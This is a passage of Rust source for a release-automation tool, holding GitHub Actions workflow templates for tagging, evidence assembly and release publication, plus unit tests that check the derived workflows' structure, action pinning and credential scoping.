  - id: @SENTINEL@
    name: Check out the released commit
    uses: @CHECKOUT@
    with:
      fetch-depth: 0
      fetch-tags: true
      persist-credentials: false
@TOOLCHAIN_STEPS@  - name: @BUILD_NAME@
    working-directory: @WORKING_DIRECTORY@
    env:
      @ENVVAR@SUBJECT: ${{ runner.temp }}/@JOB@subject/@SLUG@/bytes
@BUILD_ENV@    run: |
      set -euo pipefail
      mkdir -p "${@ENVVAR@SUBJECT}"
@BUILD_COMMAND@
  - id: @JOB@record
    name: @RECORD_NAME@
    uses: @BUILT_SUBJECT_ACTION@
    with:
      release-unit: @RELEASE_UNIT@
      identity: @SUBJECT_IDENTITY@
      subject: ${{ runner.temp }}/@JOB@subject/@SLUG@/bytes
      output: ${{ runner.temp }}/@JOB@subject/@SLUG@/built-subject.yml
      intentional-version: @VERSION@
  - name: @UPLOAD_NAME@
    uses: @UPLOAD@
    with:
      name: @JOB@subject-@SLUG@
      path: ${{ runner.temp }}/@JOB@subject/@SLUG@
      retention-days: 1
  - name: @DOCUMENT_NAME@
    uses: @UPLOAD@
    with:
      name: @JOB@subjectdoc-@SLUG@
      path: ${{ runner.temp }}/@JOB@subject/@SLUG@/built-subject.yml
      retention-days: 1
"#;

/// Managed job that seals one executor phase and publishes its tags.
///
/// Tag creation is local and pushing is repository-owned: the portable command
/// never holds a credential and never writes to the repository, and the push
/// step mints the short-lived installation token that is the sole Git
/// repository-write authority.
///
/// The refs pushed are read from the repository rather than named by the
/// derivation, and that is the contract rather than a convenience. This job
/// checks out with `fetch-tags: true` and creates tags in exactly one step, so
/// the annotated tags pointing at the released commit are the ones this phase
/// sealed plus the already-published global tag, whose re-push is a no-op. That
/// set is also what makes the job idempotent: a rerun after a partial failure
/// finds some tags already present, plans none of them, and still pushes the
/// complete set, where a list of newly created refs would be empty and push
/// nothing. Naming the refs from the seal step's output would be structural but
/// would trade that recovery away, so any change to it has to keep the rerun
/// path pushing what the release already carries.
///
/// The sealed evidence is uploaded as its own artifact because assembly reads
/// documents, not tag messages; a phase whose evidence stayed inside Git would
/// be invisible to the command that has to compare it.
const PUBLISH_PHASE_TAG_JOB: &str = r#"
needs:
@NEEDS@
runs-on: ubuntu-latest
environment: @ENVIRONMENT@
permissions:
  contents: read
env:
  @ENVVAR@WORKFLOW_CONTRACT: @CONTRACT@
steps:
  - id: @SENTINEL@
    name: Check out the released commit
    uses: @CHECKOUT@
    with:
      fetch-depth: 0
      fetch-tags: true
      persist-credentials: false
  - name: Download the staged @PHASE@ evidence
    uses: @DOWNLOAD@
    with:
      pattern: @JOB@@STAGED@-*
      path: ${{ runner.temp }}/@JOB@staged
  - name: @SEAL_NAME@
    uses: @TAG_PHASE_ACTION@
    with:
      phase: @PHASE@
      evidence: ${{ runner.temp }}/@JOB@staged
      sealed-output: ${{ runner.temp }}/@JOB@phase/@PHASE@
      intentional-version: @VERSION@
  - id: @JOB@token
    name: Mint a short-lived repository token
    uses: @APP_TOKEN@
    with:
      app-id: ${{ vars.@ENVVAR@GITHUB_APP_ID }}
      private-key: ${{ secrets.@ENVVAR@GITHUB_APP_PRIVATE_KEY }}
  - name: @PUSH_NAME@
    env:
      GITHUB_TOKEN: ${{ steps.@JOB@token.outputs.token }}
    run: |
      set -euo pipefail
      git remote set-url origin \
        "https://x-access-token:${GITHUB_TOKEN}@github.com/${GITHUB_REPOSITORY}.git"
      mapfile -t refs < <(git tag --points-at HEAD --format='refs/tags/%(refname:strip=2)')
      test "${#refs[@]}" -gt 0
      git push --atomic origin "${refs[@]}"
  - name: @UPLOAD_NAME@
    uses: @UPLOAD@
    with:
      name: @JOB@phase-@PHASE@
      path: ${{ runner.temp }}/@JOB@phase/@PHASE@
      retention-days: 1
"#;

const PUBLISH_PUBLISHER_JOB: &str = r#"
needs:
@NEEDS@
runs-on: ubuntu-latest
permissions:
@PERMISSIONS@
env:
  @ENVVAR@WORKFLOW_CONTRACT: @CONTRACT@
steps:
  - id: @SENTINEL@
    name: Check out the released commit
    uses: @CHECKOUT@
    with:
      fetch-depth: 0
      fetch-tags: true
      persist-credentials: false
  - name: @SUBJECT_NAME@
    uses: @DOWNLOAD@
    with:
      name: @JOB@subject-@SUBJECT_SLUG@
      path: ${{ runner.temp }}/@JOB@subject
@RECIPE_STEPS@  - name: @VERIFY_NAME@
    uses: @VERIFY_PUBLICATION_ACTION@
    with:
      release-unit: @RELEASE_UNIT@
      publisher: @PUBLISHER@
      target: @TARGET@
      observation: @OBSERVATION@
      output: @OUTPUT@
      draft-handoff: @HANDOFF@
      intentional-version: @VERSION@
  - name: @FRAGMENT_NAME@
    uses: @UPLOAD@
    with:
      name: @JOB@evidence-@SLUG@
      path: ${{ runner.temp }}/@JOB@evidence/@SLUG@.yml
      retention-days: 1
"#;

const PUBLISH_ASSEMBLE_JOB: &str = r#"
needs:
@NEEDS@
runs-on: ubuntu-latest
permissions:
  contents: read
env:
  @ENVVAR@WORKFLOW_CONTRACT: @CONTRACT@
steps:
  - id: @SENTINEL@
    name: Check out the released commit
    uses: @CHECKOUT@
    with:
      fetch-depth: 0
      fetch-tags: true
      persist-credentials: false
  - name: Download every evidence fragment
    uses: @DOWNLOAD@
    with:
      pattern: @JOB@evidence-*
      path: ${{ runner.temp }}/@JOB@fragments
  - name: Download every sealed phase document
    uses: @DOWNLOAD@
    with:
      pattern: @JOB@phase-*
      path: ${{ runner.temp }}/@JOB@fragments
  - name: Assemble the release evidence
    uses: @ASSEMBLE_ACTION@
    with:
      input: ${{ runner.temp }}/@JOB@fragments
      output: ${{ runner.temp }}/@JOB@release
      intentional-version: @VERSION@
  - name: Upload the assembled release evidence
    uses: @UPLOAD@
    with:
      name: @JOB@release-evidence
      path: ${{ runner.temp }}/@JOB@release
      retention-days: 1
"#;

const PUBLISH_CLOSE_JOB: &str = r#"
needs:
@NEEDS@
runs-on: ubuntu-latest
environment: @ENVIRONMENT@
permissions:
  contents: read
env:
  @ENVVAR@WORKFLOW_CONTRACT: @CONTRACT@
steps:
  - id: @SENTINEL@
    name: Check out the released commit
    uses: @CHECKOUT@
    with:
      fetch-depth: 0
      fetch-tags: true
      persist-credentials: false
  - name: Download the assembled release evidence
    uses: @DOWNLOAD@
    with:
      name: @JOB@release-evidence
      path: ${{ runner.temp }}/@JOB@release
  - id: @JOB@token
    name: Mint a short-lived Release token
    uses: @APP_TOKEN@
    with:
      app-id: ${{ vars.@ENVVAR@GITHUB_APP_ID }}
      private-key: ${{ secrets.@ENVVAR@GITHUB_APP_PRIVATE_KEY }}
  - name: Publish the immutable GitHub Release
    env:
      GH_TOKEN: ${{ steps.@JOB@token.outputs.token }}
      @ENVVAR@GLOBAL_TAG: ${{ github.ref_name }}
      @ENVVAR@RELEASE: ${{ runner.temp }}/@JOB@release
    run: |
      set -euo pipefail
      test "$(gh release view "${@ENVVAR@GLOBAL_TAG}" --json isDraft --jq '.isDraft')" = "true"
      test "$(gh release view "${@ENVVAR@GLOBAL_TAG}" --json tagName --jq '.tagName')" = "${@ENVVAR@GLOBAL_TAG}"
      test "$(gh api "repos/${GITHUB_REPOSITORY}/git/ref/tags/${@ENVVAR@GLOBAL_TAG}" \
        --jq '.object.sha' | xargs -I {} gh api "repos/${GITHUB_REPOSITORY}/git/tags/{}" \
        --jq '.object.sha')" = "${GITHUB_SHA}"
      gh release upload "${@ENVVAR@GLOBAL_TAG}" \
        "${@ENVVAR@RELEASE}"/* --clobber
      for asset in "${@ENVVAR@RELEASE}"/*; do
        name="$(basename "${asset}")"
        gh release download "${@ENVVAR@GLOBAL_TAG}" --pattern "${name}" \
          --output - > "${RUNNER_TEMP}/@JOB@closure-asset"
        printf '%s  %s\n' "$(sha256sum < "${asset}" | cut -d' ' -f1)" \
          "${RUNNER_TEMP}/@JOB@closure-asset" | sha256sum --check --status
      done
      gh release edit "${@ENVVAR@GLOBAL_TAG}" --draft=false
"#;

#[cfg(test)]
mod tests {
    use super::*;
    use crate::evidence::assemble::CleanClientMode;
    use crate::executor::fixture::Workspace;
    use crate::publication::observation::ObservationState;
    use std::collections::BTreeMap;

    const CONFIG: &str = r#"$schema: https://intentional.foo/schemas/config.yml
contract: contract-1
workspace-tags:
  release:
    template: '{version}'
github:
  workflows:
    release: { path: .github/workflows/release.yml, gates: [ candidate_check ] }
    publish: { path: .github/workflows/publish.yml, gates: [ artifact_check ] }
release-units:
  component:
    path: component
    cargo: {}
    tags:
      primary: { role: primary, template: '{id}@{version}', require-phase: after-publication }
      staged: { role: projection, template: '{id}/staged@{version}', require-phase: before-publication }
"#;

    const REPOSITORY_RELEASE_WORKFLOW: &str = r#"# maintained by the repository
name: release

on:
  workflow_dispatch:

jobs:
  # gates the authority transition
  candidate_check:
    runs-on: ubuntu-latest
    steps:
      - run: 'true'
"#;

    const REPOSITORY_PUBLISH_WORKFLOW: &str = r#"name: publish

on:
  push:
    tags:
      - 'legacy-*'

jobs:
  artifact_check:
    runs-on: ubuntu-latest
    steps:
      - run: 'true'
"#;

    fn workspace(label: &str) -> Workspace {
        let workspace = Workspace::new(label);
        workspace
            .write(".intentional/config.yml", CONFIG)
            .write(
                "component/Cargo.toml",
                "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\n",
            )
            .write(".github/workflows/release.yml", REPOSITORY_RELEASE_WORKFLOW)
            .write(".github/workflows/publish.yml", REPOSITORY_PUBLISH_WORKFLOW);
        workspace
    }

    fn converge(root: &Path, role: WorkflowRole) -> WorkflowComparison {
        let comparison = compare_workflow(root, role, None).expect("comparison runs");
        assert_eq!(
            comparison.status,
            ComparisonStatus::Different,
            "{:?}",
            comparison.diagnostics
        );
        comparison.apply().expect("transformation applies")
    }

    fn workflow(root: &Path, role: WorkflowRole) -> String {
        std::fs::read_to_string(root.join(format!(".github/workflows/{role}.yml")))
            .expect("workflow readable")
    }

    #[test]
    fn adds_the_complete_release_contract_and_preserves_repository_content() {
        let workspace = workspace("workflow-release");
        converge(workspace.root(), WorkflowRole::Release);
        let updated = workflow(workspace.root(), WorkflowRole::Release);

        assert!(
            updated.starts_with("# maintained by the repository\nname: release\n"),
            "repository header and comments survive: {updated}"
        );
        assert!(
            updated.contains("  # gates the authority transition\n  candidate_check:"),
            "the repository-owned gate job and its comment survive: {updated}"
        );
        assert!(
            updated.contains("concurrency:") && updated.contains("cancel-in-progress: false"),
            "the release concurrency policy is added: {updated}"
        );
        assert!(
            updated.contains("permissions:\n  contents: read\n"),
            "the safe top-level permission default is added: {updated}"
        );
        assert!(
            updated.contains("  intentional_prepare:")
                && updated.contains("  intentional_release:"),
            "both reserved release jobs are inserted: {updated}"
        );
        assert!(
            updated.contains("      - candidate_check"),
            "the configured gate becomes a dependency of the authority transition: {updated}"
        );
        let document: Value = serde_yaml::from_str(&updated).expect("result parses");
        assert_eq!(
            document["jobs"]["intentional_release"]["environment"].as_str(),
            Some("intentional-release")
        );
    }

    #[test]
    fn reports_a_read_only_patch_without_changing_the_workflow() {
        let workspace = workspace("workflow-read-only");
        let before = workflow(workspace.root(), WorkflowRole::Release);
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Release, None).expect("comparison");
        assert!(comparison.changed());
        assert!(!comparison.applied);
        assert!(
            comparison.patch.contains("+  intentional_prepare:"),
            "{}",
            comparison.patch
        );
        assert_eq!(
            workflow(workspace.root(), WorkflowRole::Release),
            before,
            "a comparison without apply never writes"
        );
    }

    #[test]
    fn converges_and_then_reports_conformance() {
        let workspace = workspace("workflow-idempotent");
        for role in WorkflowRole::ALL {
            let applied = converge(workspace.root(), role);
            assert!(applied.applied);
            let repeated = compare_workflow(workspace.root(), role, None).expect("recompare");
            assert_eq!(
                repeated.status,
                ComparisonStatus::Conformant,
                "reconciliation is idempotent for {role}: {}",
                repeated.patch
            );
            assert_eq!(
                repeated.input_digest,
                applied.output_digest.expect("digest")
            );
        }
    }

    #[test]
    fn replaces_a_drifted_reserved_job_and_leaves_repository_jobs_alone() {
        let workspace = workspace("workflow-drift");
        converge(workspace.root(), WorkflowRole::Release);
        let converged = workflow(workspace.root(), WorkflowRole::Release);
        let weakened = converged.replace(
            "  intentional_prepare:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n",
            "  intentional_prepare:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n",
        );
        assert_ne!(
            weakened, converged,
            "the fixture weakens a managed permission"
        );
        std::fs::write(
            workspace.root().join(".github/workflows/release.yml"),
            &weakened,
        )
        .expect("write drifted workflow");

        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Release, None).expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Different);
        let restored = comparison.apply().expect("apply");
        assert!(restored.applied);
        assert_eq!(workflow(workspace.root(), WorkflowRole::Release), converged);
    }

    #[test]
    fn refuses_a_transformation_computed_from_stale_bytes() {
        let workspace = workspace("workflow-stale");
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Release, None).expect("comparison");
        let path = workspace.root().join(".github/workflows/release.yml");
        std::fs::write(
            &path,
            format!("# edited elsewhere\n{REPOSITORY_RELEASE_WORKFLOW}"),
        )
        .expect("concurrent edit");

        let error = comparison
            .apply()
            .expect_err("stale transformation refused");
        assert!(
            error
                .to_string()
                .contains("Workflow input digest does not match"),
            "{error}"
        );
        assert!(
            std::fs::read_to_string(&path)
                .expect("workflow readable")
                .starts_with("# edited elsewhere"),
            "the newer workflow is left intact"
        );
    }

    #[test]
    fn migrates_sentinel_bearing_slices_and_preserves_unsentinelized_old_prefix_jobs() {
        let workspace = workspace("workflow-prefix");
        converge(workspace.root(), WorkflowRole::Release);
        let converged = workflow(workspace.root(), WorkflowRole::Release);
        std::fs::write(
            workspace.root().join(".github/workflows/release.yml"),
            converged.replace(
                "jobs:\n",
                "jobs:\n  intentional_legacy:\n    runs-on: ubuntu-latest\n    steps:\n      - run: 'true'\n",
            ),
        )
        .expect("add an unsentinelized old-prefix job");
        workspace.write(
            ".intentional/config.yml",
            &CONFIG.replace("github:\n", "github:\n  prefix: replacement\n"),
        );

        converge(workspace.root(), WorkflowRole::Release);
        let migrated = workflow(workspace.root(), WorkflowRole::Release);
        assert!(
            migrated.contains("  replacement_prepare:")
                && migrated.contains("  replacement_release:"),
            "newly prefixed slices are inserted: {migrated}"
        );
        assert!(
            !migrated.contains("  intentional_prepare:")
                && !migrated.contains("  intentional_release:"),
            "sentinel-bearing slices under the old prefix are removed: {migrated}"
        );
        assert!(
            migrated.contains("  intentional_legacy:"),
            "an old-prefix job without the sentinel stays repository-owned: {migrated}"
        );
    }

    #[test]
    fn derives_publisher_closure_and_gate_dependencies_for_publication() {
        let workspace = workspace("workflow-publish");
        converge(workspace.root(), WorkflowRole::Publish);
        let updated = workflow(workspace.root(), WorkflowRole::Publish);

        assert!(
            updated.contains("      - 'legacy-*'") || updated.contains("      - legacy-*"),
            "the repository's own tag trigger survives: {updated}"
        );
        assert!(
            updated.contains("intentional_publish_component_cargo_primary:"),
            "the resolved publication derives a managed job: {updated}"
        );
        assert!(
            updated.contains("intentional_assemble_evidence:")
                && updated.contains("intentional_close_release:"),
            "evidence assembly and closure jobs are derived: {updated}"
        );
        let document: Value = serde_yaml::from_str(&updated).expect("result parses");
        let closure = &document["jobs"]["intentional_close_release"]["needs"];
        assert!(
            closure
                .as_sequence()
                .expect("closure needs")
                .contains(&Value::String("artifact_check".to_owned())),
            "the configured publish gate governs closure: {closure:?}"
        );
        let tags = document["on"]["push"]["tags"].as_sequence().expect("tags");
        assert_eq!(
            tags.len(),
            2,
            "the global release tag joins the repository's own: {tags:?}"
        );
    }

    /// Steps of every managed job in one derived workflow, by job identifier.
    fn managed_steps(root: &Path, role: WorkflowRole) -> Vec<(String, Vec<Value>)> {
        let document: Value = serde_yaml::from_str(&workflow(root, role)).expect("result parses");
        document["jobs"]
            .as_mapping()
            .expect("jobs")
            .iter()
            .filter_map(|(id, body)| {
                let id = id.as_str()?;
                id.starts_with("intentional_").then(|| {
                    (
                        id.to_owned(),
                        body["steps"].as_sequence().expect("steps").clone(),
                    )
                })
            })
            .collect()
    }

    /// The Action one managed step resolves from this repository, if any.
    fn intentional_action(step: &Value) -> Option<(String, String)> {
        step.get("uses")?
            .as_str()?
            .strip_prefix("wyrd-company/intentional/actions/")?
            .split_once('@')
            .map(|(name, reference)| (name.to_owned(), reference.to_owned()))
    }

    /// The document one published Action is defined by.
    fn action_document(name: &str) -> PathBuf {
        Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../../actions")
            .join(name)
            .join("action.yml")
    }

    /// The declared outputs of one published Action.
    fn action_outputs(name: &str) -> BTreeSet<String> {
        let path = action_document(name);
        let document: Value = serde_yaml::from_str(
            &std::fs::read_to_string(&path).expect("action document readable"),
        )
        .expect("action document parses");
        document
            .get("outputs")
            .and_then(Value::as_mapping)
            .map(|outputs| {
                outputs
                    .keys()
                    .filter_map(Value::as_str)
                    .map(str::to_owned)
                    .collect()
            })
            .unwrap_or_default()
    }

    // A stock runner carries no `intentional` on PATH, and nothing in this
    // crate writes `$GITHUB_OUTPUT`. A managed job that spelled a portable
    // command in a `run:` body would therefore both fail to find the binary and
    // produce no step outputs for the next step to read. Reaching every
    // portable command through a published Action is what supplies both, so the
    // absence of a bare invocation is the property worth asserting rather than
    // the presence of any particular step text.
    #[test]
    fn reaches_every_portable_command_through_a_published_action() {
        let workspace = workspace("workflow-command-boundary");
        let expected = [
            (
                WorkflowRole::Release,
                ["prepare-release", "verify-handoff"].as_slice(),
            ),
            (
                WorkflowRole::Publish,
                [
                    "assemble-evidence",
                    "record-built-subject",
                    "seal-phase-tags",
                    "verify-publication",
                    "verify-release-tag",
                ]
                .as_slice(),
            ),
        ];
        for (role, actions) in expected {
            converge(workspace.root(), role);
            let mut resolved = BTreeSet::new();
            for (id, steps) in managed_steps(workspace.root(), role) {
                for step in &steps {
                    if let Some((name, _)) = intentional_action(step) {
                        resolved.insert(name);
                    }
                    for line in step
                        .get("run")
                        .and_then(Value::as_str)
                        .unwrap_or_default()
                        .lines()
                    {
                        let command = line.split_whitespace().next().unwrap_or_default();
                        assert_ne!(
                            command.rsplit('/').next(),
                            Some("intentional"),
                            "{id} runs a portable command without obtaining the binary: {line}"
                        );
                    }
                }
            }
            assert_eq!(
                resolved,
                actions
                    .iter()
                    .map(|name| (*name).to_owned())
                    .collect::<BTreeSet<_>>(),
                "the {role} workflow reaches exactly the portable commands its protocol runs"
            );
        }
    }

    // One derivation names one Action revision and one binary revision. A job
    // that resolved the Action at one version while installing another would
    // run an argument contract neither document states.
    #[test]
    fn pins_every_intentional_action_and_its_binary_to_the_deriving_version() {
        let workspace = workspace("workflow-action-pinning");
        for role in WorkflowRole::ALL {
            converge(workspace.root(), role);
            let mut pinned = 0;
            for (id, steps) in managed_steps(workspace.root(), role) {
                for step in &steps {
                    let Some((name, reference)) = intentional_action(step) else {
                        continue;
                    };
                    pinned += 1;
                    assert_eq!(reference, crate::VERSION, "{id} resolves {name}");
                    assert!(
                        action_document(&name).is_file(),
                        "{id} resolves an Action this repository publishes; {name} is not one"
                    );
                    assert_eq!(
                        step["with"]["intentional-version"].as_str(),
                        Some(crate::VERSION),
                        "{id} installs the binary {name} states its contract for"
                    );
                }
            }
            assert!(pinned > 0, "the {role} workflow resolves managed Actions");
        }
    }

    // A managed job that reaches a portable command through an Action installs
    // a released binary over the network, and the authority transition is also
    // the job that mints repository-write authority. Ordering is what keeps the
    // two apart: no credential exists on the runner while Intentional's own
    // Action is fetched and executed. Moving the mint earlier would read as a
    // harmless reordering and would silently widen the job's trust boundary, so
    // the order is asserted rather than described.
    #[test]
    fn resolves_every_intentional_action_before_any_credential_is_minted() {
        let workspace = workspace("workflow-credential-order");
        for role in WorkflowRole::ALL {
            converge(workspace.root(), role);
            for (id, steps) in managed_steps(workspace.root(), role) {
                let mint = steps.iter().position(|step| {
                    step.get("uses")
                        .and_then(Value::as_str)
                        .is_some_and(|uses| uses == APP_TOKEN_ACTION)
                });
                let Some(mint) = mint else { continue };
                for (index, step) in steps.iter().enumerate() {
                    assert!(
                        intentional_action(step).is_none() || index < mint,
                        "{id} resolves an Intentional Action after minting a credential"
                    );
                }
            }
        }
    }

    // The authority transition pushes to the protected default branch using
    // identities the previous step verified. Before this binding existed the
    // step it read produced no outputs at all, so the guard compared the remote
    // head against an empty string and the push resolved empty refs. Asserting
    // that the consumed step is an Action that declares those exact outputs is
    // what makes that shape impossible rather than merely absent.
    #[test]
    fn binds_the_verified_handoff_outputs_to_the_push_step() {
        let workspace = workspace("workflow-identity-binding");
        converge(workspace.root(), WorkflowRole::Release);
        let steps = managed_steps(workspace.root(), WorkflowRole::Release)
            .into_iter()
            .find(|(id, _)| id == "intentional_release")
            .expect("the authority transition is derived")
            .1;

        let (verifier, action) = steps
            .iter()
            .find_map(|step| {
                let (name, _) = intentional_action(step)?;
                (name == "verify-handoff")
                    .then(|| (step["id"].as_str().expect("the step is addressable"), name))
            })
            .expect("the authority transition verifies the handoff through the Action");

        let push = steps
            .iter()
            .find(|step| {
                step.get("run")
                    .and_then(Value::as_str)
                    .is_some_and(|body| body.contains("git push --atomic"))
            })
            .expect("the authority transition pushes");
        let consumed = push["env"]
            .as_mapping()
            .expect("the push step names its inputs")
            .values()
            .filter_map(Value::as_str)
            .filter_map(|value| {
                value
                    .strip_prefix(&format!("${{{{ steps.{verifier}.outputs."))?
                    .strip_suffix(" }}")
                    .map(str::to_owned)
            })
            .collect::<BTreeSet<_>>();

        assert_eq!(
            consumed,
            ["global-tag", "release-sha", "source-sha"]
                .into_iter()
                .map(str::to_owned)
                .collect::<BTreeSet<_>>(),
            "the push step reads the verified identities from the verifying step"
        );
        let declared = action_outputs(&action);
        for key in &consumed {
            assert!(
                declared.contains(key),
                "the {action} Action declares {key}; declared: {declared:?}"
            );
        }
    }

    /// A workspace whose one release unit distributes one subject to two OCI destinations.
    const TWO_DESTINATION_CONFIG: &str = r#"$schema: https://intentional.foo/schemas/config.yml
contract: contract-1
workspace-tags:
  release:
    template: '{version}'
github:
  workflows:
    release: { path: .github/workflows/release.yml }
    publish: { path: .github/workflows/publish.yml, gates: [ artifact_check ] }
release-units:
  component:
    path: component
    oci:
      dockerhub: { repository: example-owner/example-image }
      ghcr: {}
    tags:
      staged:
        role: primary
        template: '{id}/staged@{version}'
        require-phase: before-publication
      published:
        role: projection
        template: '{id}/published@{version}'
        require-phase: after-publication
"#;

    /// A workspace whose one Go release unit publishes to two GoReleaser destinations.
    ///
    /// One packager, two publishers: the shape that proves one build is promoted
    /// to both destinations rather than rebuilt for each. RPM and APT are absent
    /// because the job that uploads their deliverable to the draft Release is
    /// not settled, and the derivation refuses them rather than deriving a
    /// publisher job that publishes nothing.
    const GO_CONFIG: &str = r#"$schema: https://intentional.foo/schemas/config.yml
contract: contract-1
workspace-tags:
  release:
    template: '{version}'
github:
  workflows:
    release: { path: .github/workflows/release.yml }
    publish: { path: .github/workflows/publish.yml, gates: [ artifact_check ] }
release-units:
  component:
    path: component
    homebrew: { repository: example-org/homebrew-tap }
    aur: {}
    tags:
      staged:
        role: primary
        template: '{id}/staged@{version}'
        require-phase: before-publication
      published:
        role: projection
        template: '{id}/published@{version}'
        require-phase: after-publication
"#;

    /// Native GoReleaser configuration declaring every pipe the recipes promote.
    const GORELEASER_CONFIG: &str = r#"version: 2
project_name: example-tool
builds:
  - main: ./cmd/example-tool
brews:
  - repository: { owner: example-org, name: homebrew-tap }
nfpms:
  - formats: [ rpm, deb ]
aur:
  - name: example-tool-bin
"#;

    fn go_workspace(label: &str) -> Workspace {
        let workspace = workspace(label);
        workspace
            .write(".intentional/config.yml", GO_CONFIG)
            // The module's last element is deliberately not the release-unit
            // id, so a derivation that fell back to the id is distinguishable
            // from one that read the module.
            .write("component/go.mod", "module example.test/example-module\n")
            .write(
                "component/cmd/example-tool/main.go",
                "package main\n\nfunc main() {}\n",
            )
            .write("component/.goreleaser.yaml", GORELEASER_CONFIG);
        workspace
    }

    // The sealed subject identity is what a publisher fragment is compared
    // against, so a Go release unit that named the release-unit id would agree
    // with the seal by making both sides wrong. GoReleaser names the formula,
    // the system packages, and the Arch package from the project name, so that
    // is the one identity every destination resolves.
    #[test]
    fn names_the_native_goreleaser_project_as_the_subject_identity() {
        let workspace = go_workspace("workflow-go-identity");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());
        let build = "intentional_build_component_goreleaser";
        let identity = jobs[&Value::String(build.to_owned())]["steps"]
            .as_sequence()
            .expect("steps")
            .iter()
            .find_map(|step| step["with"]["identity"].as_str())
            .expect("the build job records a subject identity");
        assert_eq!(
            identity, "example-tool",
            "the subject identity is the native project name, not the release-unit id"
        );

        // Without an explicit project name the module path's last element is
        // what Go names the command, and it is still native evidence rather
        // than the release-unit id.
        workspace.write(
            "component/.goreleaser.yaml",
            &GORELEASER_CONFIG.replace("project_name: example-tool\n", ""),
        );
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());
        let identity = jobs[&Value::String(build.to_owned())]["steps"]
            .as_sequence()
            .expect("steps")
            .iter()
            .find_map(|step| step["with"]["identity"].as_str())
            .expect("the build job records a subject identity");
        assert_eq!(identity, "example-module");
    }

    /// Steps of one derived job, as name-and-body pairs.
    fn job_steps(jobs: &serde_yaml::Mapping, id: &str) -> Vec<Value> {
        jobs[&Value::String(id.to_owned())]["steps"]
            .as_sequence()
            .expect("steps")
            .clone()
    }

    /// Every `run:` body one derived job executes, concatenated.
    fn job_run_bodies(jobs: &serde_yaml::Mapping, id: &str) -> String {
        job_steps(jobs, id)
            .iter()
            .filter_map(|step| step["run"].as_str())
            .collect::<Vec<_>>()
            .join("\n")
    }

    // GoReleaser's open-source distribution cannot publish a dist tree a
    // previous invocation built, so a recipe that reached its destination by
    // running the packager again would rebuild from source and produce a
    // subject whose digest cannot equal the one the release sealed. This is the
    // rule the whole build-once graph rests on for Go.
    #[test]
    fn promotes_what_the_go_build_produced_rather_than_running_the_packager_again() {
        let workspace = go_workspace("workflow-go-promote");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());

        let builds = job_ids(&jobs, "intentional_build_");
        assert_eq!(
            builds,
            vec!["intentional_build_component_goreleaser".to_owned()],
            "two destinations of one packager derive one build job: {builds:?}"
        );
        assert!(
            job_run_bodies(&jobs, &builds[0]).contains("goreleaser release"),
            "the build job is where the packager runs"
        );

        let publishers = job_ids(&jobs, "intentional_publish_");
        assert_eq!(publishers.len(), 2, "{publishers:?}");
        for publisher in &publishers {
            let body = job_run_bodies(&jobs, publisher);
            assert!(
                !body.contains("goreleaser"),
                "{publisher} promotes what the build produced rather than rebuilding it: {body}"
            );
            let downloads = job_steps(&jobs, publisher)
                .iter()
                .filter_map(|step| step["with"]["name"].as_str())
                .filter(|name| name.starts_with("intentional_subject-"))
                .map(str::to_owned)
                .collect::<Vec<_>>();
            assert_eq!(
                downloads,
                vec!["intentional_subject-component_goreleaser".to_owned()],
                "{publisher} consumes the one built subject"
            );
        }
    }

    // A tap is a different repository from the one being released, and the App
    // is installed on it narrowly. A token minted without naming that repository
    // would carry every permission the App holds everywhere it is installed.
    #[test]
    fn mints_the_tap_token_for_the_configured_repository_alone() {
        let workspace = go_workspace("workflow-go-token");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());
        let homebrew = "intentional_publish_component_homebrew_primary";

        let token = job_steps(&jobs, homebrew)
            .into_iter()
            .find(|step| step["id"].as_str() == Some("intentional_destination_token"))
            .expect("the homebrew job mints a destination token");
        assert_eq!(token["with"]["owner"].as_str(), Some("example-org"));
        assert_eq!(token["with"]["repository"].as_str(), None);
        assert_eq!(token["with"]["repositories"].as_str(), Some("homebrew-tap"));

        // The promotion reads the token through the environment and writes to
        // the configured tap, and both values reach the shell as variables
        // rather than as text spliced into the body.
        let body = job_run_bodies(&jobs, homebrew);
        assert!(
            body.contains("${INTENTIONAL_DESTINATION}") && body.contains("${GITHUB_TOKEN}"),
            "{body}"
        );
        assert!(
            !body.contains("example-org/homebrew-tap"),
            "the destination reaches the shell as a variable: {body}"
        );
    }

    // The Arch User Repository is a Git host of its own rather than a GitHub
    // repository, so an installation token reaches nothing there.
    #[test]
    fn reaches_the_arch_user_repository_through_its_own_authority() {
        let workspace = go_workspace("workflow-go-aur");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());
        let aur = "intentional_publish_component_aur_primary";

        assert!(
            !job_steps(&jobs, aur)
                .iter()
                .any(|step| step["id"].as_str() == Some("intentional_destination_token")),
            "no installation token is minted for a destination GitHub does not host"
        );
        let body = job_run_bodies(&jobs, aur);
        assert!(body.contains("ssh://aur@aur.archlinux.org/"), "{body}");
        assert!(body.contains("${INTENTIONAL_AUR_KEY}"), "{body}");
        let environment = job_steps(&jobs, aur)
            .into_iter()
            .find_map(|step| {
                step["env"]["INTENTIONAL_AUR_KEY"]
                    .as_str()
                    .map(str::to_owned)
            })
            .expect("the promotion reads the key from the environment");
        assert_eq!(
            environment, "${{ secrets.INTENTIONAL_AUR_KEY }}",
            "the recipe names a conventional secret and never carries its value"
        );
    }

    // A build job that cannot run its packager produces nothing, and this job
    // is the sole producer of every Go deliverable the publisher jobs promote.
    // A stock runner does not carry GoReleaser.
    #[test]
    fn installs_the_packager_the_go_build_job_runs() {
        let workspace = go_workspace("workflow-go-toolchain");
        converge(workspace.root(), WorkflowRole::Publish);
        let jobs = publish_jobs(workspace.root());
        let build = "intentional_build_component_goreleaser";
        let steps = job_steps(&jobs, build);
        let installer = steps
            .iter()
            .position(|step| {
                step["uses"]
                    .as_str()
                    .is_some_and(|uses| uses.starts_with("goreleaser/goreleaser-action@"))
            })
            .expect("the build job installs the packager");
